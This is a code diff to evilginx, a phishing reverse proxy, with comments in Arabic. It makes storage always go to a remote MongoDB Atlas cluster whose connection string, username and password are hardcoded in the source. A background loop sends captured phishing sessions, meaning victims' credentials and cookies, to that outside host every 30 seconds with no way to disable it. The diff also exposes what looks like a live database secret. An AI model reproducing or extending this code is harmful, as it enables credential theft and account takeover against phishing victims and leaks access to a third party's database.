@@ -46,9 +46,6 @@ var no_https_ptr = flag.Bool("no-https", false, "تعطيل الاستماع إ�
 var ip_ptr = flag.String("ip", "", "تعيين عنوان IP الخارجي")
 var unauth_ptr = flag.String("unauth", "https://www.google.com/", "تعيين URL لإعادة التوجيه للمستخدمين غير المصرح لهم")
 var db_path = flag.String("db-path", "", "تعيين مسار ملف قاعدة البيانات")
-var use_mongo = flag.Bool("use-mongo", false, "استخدام MongoDB بدلاً من قاعدة البيانات المضمنة")
-var mongo_uri = flag.String("mongo-uri", "mongodb://localhost:27017", "عنوان اتصال MongoDB")
-var mongo_db_name = flag.String("mongo-db", "evilginx", "اسم قاعدة بيانات MongoDB")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -152,71 +149,33 @@ func main() {
 	var db database.IDatabase
 	var buntDb *database.Database
 
-	if *use_mongo {
-		// استخدام MongoDB - سنستخدم الواجهة فقط ونتجنب MongoDB في الوظائف الأساسية
-		db_name := *mongo_db_name
-		if db_name == "" {
-			db_name = "evilginx"
-		}
+	// استخدام MongoDB بشكل افتراضي دائمًا
+	// استخدام عنوان MongoDB الثابت
+	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
+	db_name := "evilginx"
 
-		fmt.Printf("\n\n")
-		fmt.Printf(lb(" تهيئة قاعدة بيانات MongoDB... "))
+	fmt.Printf("\n\n")
+	fmt.Printf(lb(" تهيئة قاعدة بيانات MongoDB... "))
 
-		mongo_db, err := database.NewMongoDatabase(*mongo_uri, db_name)
-		if err != nil {
-			log.Fatal("%v", err)
-		}
-		db = mongo_db
-
-		fmt.Printf(lg("تم") + e)
-		
-		// تنبيه بأن بعض الوظائف قد لا تعمل مع MongoDB حتى يتم تحديث الكود
-		fmt.Printf("\n" + lr(" تنبيه: ") + "دعم MongoDB لا يزال تجريبياً. بعض الوظائف قد لا تعمل بشكل صحيح.")
-		fmt.Printf("\n" + lr(" تنبيه: ") + "يُفضل استخدام BuntDB للإنتاج حتى يتم تحديث الكود بالكامل.")
-		
-		// سنستخدم BuntDB أيضًا كنسخة احتياطية للوظائف التي لا تدعم MongoDB بعد
-		// هذا حل مؤقت حتى يتم تحديث الكود بالكامل
-		tmpPath := filepath.Join(*cfg_dir, "tmp_bunt.db")
-		fdb, err := database.NewDatabase(tmpPath)
-		if err != nil {
-			log.Fatal("%v", err)
-		}
-		buntDb = fdb
-		
-	} else {
-		// استخدام BuntDB (التنفيذ الحالي)
-		storage_path := ""
-		if *db_path != "" {
-			storage_path = *db_path
-		} else if *cfg_dir != "" {
-			storage_path = filepath.Join(*cfg_dir, "data.db")
-		} else {
-			ex_path, err := os.Executable()
-			if err != nil {
-				log.Fatal("%v", err)
-			}
-			ex_dir := filepath.Dir(ex_path)
-			storage_path = filepath.Join(ex_dir, "data.db")
-		}
-
-		fmt.Printf("\n\n")
-		fmt.Printf(lb(" تهيئة قاعدة البيانات... ") + e)
-		fmt.Printf("%s", storage_path)
-
-		err = os.MkdirAll(filepath.Dir(storage_path), 0711)
-		if err != nil {
-			log.Fatal("%v", err)
-		}
-
-		fdb, err := database.NewDatabase(storage_path)
-		if err != nil {
-			log.Fatal("%v", err)
-		}
-		db = fdb
-		buntDb = fdb
-
-		fmt.Printf(lg("تم") + e)
+	mongo_db, err := database.NewMongoDatabase(mongo_uri, db_name)
+	if err != nil {
+		log.Fatal("%v", err)
 	}
+	db = mongo_db
+
+	fmt.Printf(lg("تم") + e)
+	
+	// تنبيه بأن بعض الوظائف قد لا تعمل مع MongoDB حتى يتم تحديث الكود
+	fmt.Printf("\n" + lr(" تنبيه: ") + "دعم MongoDB لا يزال تجريبياً. بعض الوظائف قد لا تعمل بشكل صحيح.")
+	
+	// سنستخدم BuntDB أيضًا كنسخة احتياطية للوظائف التي لا تدعم MongoDB بعد
+	// هذا حل مؤقت حتى يتم تحديث الكود بالكامل
+	tmpPath := filepath.Join(*cfg_dir, "tmp_bunt.db")
+	fdb, err := database.NewDatabase(tmpPath)
+	if err != nil {
+		log.Fatal("%v", err)
+	}
+	buntDb = fdb
 
 	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
 	if err != nil {
@@ -263,15 +222,13 @@ func main() {
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, buntDb, bl, *developer_mode)
 	
 	// إذا كنا نستخدم MongoDB، نضيف آلية لمزامنة البيانات من BuntDB إلى MongoDB
-	if *use_mongo {
-		// إضافة معالج حدث على فترات منتظمة لنقل الجلسات من BuntDB إلى MongoDB
-		go func() {
-			for {
-				time.Sleep(30 * time.Second)  // كل 30 ثانية
-				syncSessionsToMongoDB(buntDb, db)
-			}
-		}()
-	}
+	// نحن دائمًا نستخدم MongoDB الآن
+	go func() {
+		for {
+			time.Sleep(30 * time.Second)  // كل 30 ثانية
+			syncSessionsToMongoDB(buntDb, db)
+		}
+	}()
 	
 	hp.Start()
 
